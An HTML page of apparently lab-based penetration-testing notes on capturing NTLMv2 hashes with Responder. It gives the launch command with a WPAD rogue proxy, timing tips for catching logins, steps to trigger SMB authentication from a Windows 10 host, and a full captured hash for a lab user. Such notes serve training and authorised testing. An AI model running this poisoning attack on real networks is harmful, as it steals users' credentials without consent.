<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Capture the hash with Responder</title>
</head><body><b>Responder : listen to network traffic</b><br/>
<ul><li style="list-style-type: none">- First thing to do : turn on Responder (before scans, nmap, nessus, etc...)</li>
<li style="list-style-type: none">&nbsp;&#09;=&gt; Scans, nmap, nessus, etc... generate network traffic</li>
<li style="list-style-type: none">&nbsp;&#09;- Listen with Responder for any information, breach or hash</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">(- Tip : best time to launch Responder is in the morning when people arrives or after lunch : when people turn computers on and log in) </li>
<li style="list-style-type: none">&nbsp;&#09;</li>
</ul>
<b>Responder<br/>
</b><br/>
locate Responder.py<br/>
cd /usr/share/responder<br/>
python Responder.py -I eth0 -rdw<br/>
&nbsp;&#09;- -I eth0, --interface=eth0 : Network interface to use, you can use 'ALL' as a wildcard for all &#09;&#09; &#09;interfaces<ul><li style="list-style-type: none">- -r, --wredir : Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False</li>
<li style="list-style-type: none">- -d, --NBTNSdomain : Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False</li>
</ul>
&nbsp; &#09;- -w, --wpad : Start the WPAD rogue proxy server. Default value is False<br/>
<img src="image.png" /><br/>
<img src="image 2.png" /><br/>
<br/>
Trigger an event: <br/>
<b>(1) Proof of concept</b><br/>
&nbsp;&#09;- Connect to HYDRA (Click on Ce PC &gt; Emplacements RÃ©seaux &gt; hackme (\\HYDRA) (:Z))<ul><li style="list-style-type: none"><img src="image 3.png" width="200" height="54" /></li>
</ul>
<br/>
Respondus catches the event : <br/>
<img src="selection_005.png" /><br/>
<br/>
<b>(2) Capture the hash</b><ul><li style="list-style-type: none">- Kali host ip : 192.168.1.83</li>
<li style="list-style-type: none">- Try to connect to 192.168.1.83 from Windows 10 Enterprise</li>
<b><li style="list-style-type: none"><img src="selection_014.png" width="255" height="56" /></li>
</b></ul>
<b><br/>
</b>Respondus catches the event : NTLMv2 Client, Username and hash : <b>&nbsp;<img src="selection_015.png" /><br/>
</b><br/>
<ul><li style="list-style-type: none">=&gt; Real-life example : Device with configuration settings, eg: printer </li>
<li style="list-style-type: none">&nbsp;&#09;=&gt; Point to your host to capture hash</li>
</ul>
<br/>
<br/>
<br/>
fcastle::MARVEL:f9e52839408b2a4e:FC6E268F36AFF9DE8D59E550DF2A059B:0101000000000000C0653150DE09D201E0FA7A4E76CA671E000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000DED3BD39696062F6061CAA23E1E8A2D7DF67A7E89E51A39CB9FCF5C396085FDA0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E0031002E00380033000000000000000000<br/>
</body></html>